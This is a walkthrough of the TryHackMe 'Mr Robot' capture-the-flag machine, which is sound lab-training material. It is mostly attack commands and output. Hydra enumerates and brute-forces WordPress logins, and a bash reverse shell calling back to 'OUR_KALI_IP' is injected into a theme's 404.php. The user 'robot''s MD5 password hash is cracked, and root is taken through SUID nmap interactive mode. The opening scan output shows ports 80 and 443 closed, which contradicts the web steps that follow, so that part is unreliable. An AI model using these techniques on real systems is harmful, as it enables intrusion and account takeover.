# TryHackMe — Mr Robot CTF

## 1. Reconnaissance

First, scan the target to identify available ports and services:

```bash
nmap -sC -sV 10.114.162.152
```

Scan results:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-05 10:00 UTC
Nmap scan report for 10.114.162.152
Host is up (0.055s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https
```

At the time of the scan, ports 22, 80 and 443 were reported as `closed`, while the other 997 scanned ports were `filtered`.

Next, check the website's `robots.txt` file:

```bash
curl http://10.114.162.152/robots.txt
```

We discover a file named `fsocity.dic`. Download it, as it will be useful for WordPress credential enumeration.

## 2. Preparing the Wordlist

The downloaded dictionary contains many duplicate entries. First, check how many lines it contains:

```bash
wc -l fsocity.dic
```

Initially, the file contains 858,160 lines.

Remove duplicate entries:

```bash
sort -u fsocity.dic -o fsocity_unique.dic
```

The resulting wordlist contains only 11,451 unique entries.

This significantly reduces the number of attempts required during brute-force attacks.

## 3. WordPress Credential Discovery

The website uses WordPress. Locate its login page:

```text
http://10.114.162.152/wp-login.php
```

While testing the login form, we notice that WordPress returns different error messages depending on whether the username or password is incorrect:

- `Invalid username.` — the username does not exist.
- `The password you entered for the username ... is incorrect.` — the username exists, but the password is wrong.

This behavior allows us to enumerate valid usernames before attempting to find their passwords.

### Username enumeration with Hydra

```bash
hydra -L fsocity.dic -p test123 10.114.162.152 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

Hydra identifies a valid username:

```text
Elliot
```

### Password brute force

Now use the reduced wordlist to search for the password:

```bash
hydra -l Elliot -P fsocity_unique.dic 10.114.162.152 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.114.162.152%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -t 16 -W 1
```

Hydra discovers the credentials:

```text
Username: Elliot
Password: ER28-0652
```

We can now log in to the WordPress administration panel.

## 4. Getting a Reverse Shell

After logging in, navigate to:

**Appearance → Theme File Editor → 404.php**

Insert the following PHP reverse shell code into the file:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/OUR_KALI_IP/4444 0>&1'");
?>
```

Replace `OUR_KALI_IP` with the IP address of the Kali machine's `tun0` interface.

Start a Netcat listener on Kali:

```bash
nc -lvnp 4444
```

Save the modified file and trigger it by requesting a non-existent page on the target website.

A reverse shell connection is received.

Check the current user:

```bash
whoami
```

The shell runs as:

```text
daemon
```

## 5. First Key

Search the filesystem for the first key:

```bash
find / -name "key-1-of-3.txt" 2>/dev/null
```

Read the file using its discovered path:

```bash
cat /path/to/key-1-of-3.txt
```

The first key is accessible from the `daemon` shell.

## 6. Finding the Robot User's Password

Enumerate system users:

```bash
cat /etc/passwd
```

We discover a user named `robot`.

Check the contents of its home directory:

```bash
ls -la /home/robot
```

Two interesting files are found:

```text
key-2-of-3.txt
password.raw-md5
```

The second key is readable only by the `robot` user, so we need to obtain its password first.

Read the hash file:

```bash
cat /home/robot/password.raw-md5
```

It contains:

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

This is an MD5 hash. After cracking it offline, we obtain:

```text
abcdefghijklmnopqrstuvwxyz
```

Switch to the `robot` account:

```bash
su robot
```

Read the second key:

```bash
cat /home/robot/key-2-of-3.txt
```

## 7. Privilege Escalation to Root

Search for files with the SUID permission bit set:

```bash
find / -type f -perm -4000 2>/dev/null
```

Among the results, we discover:

```text
/usr/local/bin/nmap
```

Nmap has the SUID bit enabled. This version supports interactive mode, which can be abused to spawn a shell with elevated privileges.

Run Nmap in interactive mode:

```bash
/usr/local/bin/nmap --interactive
```

Inside the Nmap prompt, execute:

```text
!sh
```

Check the current user:

```bash
whoami
```

The output confirms root access:

```text
root
```

## 8. Third Key

Navigate to the root user's home directory:

```bash
cd /root
```

Read the final key:

```bash
cat /root/key-3-of-3.txt
```

We have now obtained all three keys.

## Summary

Tools and techniques used:

- **Nmap** — network scanning and privilege escalation through SUID.
- **Hydra** — username enumeration and password brute forcing.
- **sort -u** — removing duplicate entries from a wordlist.
- **Netcat** — receiving a reverse shell.
- **find** — searching for files and SUID binaries.
- **MD5 cracking** — recovering the `robot` user's password.
- **Nmap Interactive Mode** — obtaining root privileges.

### Attack Path

```text
robots.txt
    |
    v
fsocity.dic
    |
    v
Wordlist reduction
    |
    v
Hydra
    |
    v
WordPress login
    |
    v
PHP reverse shell
    |
    v
daemon
    |
    +----> First key
    |
    v
robot password hash
    |
    v
MD5 cracking
    |
    v
robot
    |
    +----> Second key
    |
    v
SUID Nmap
    |
    v
root
    |
    +----> Third key
```
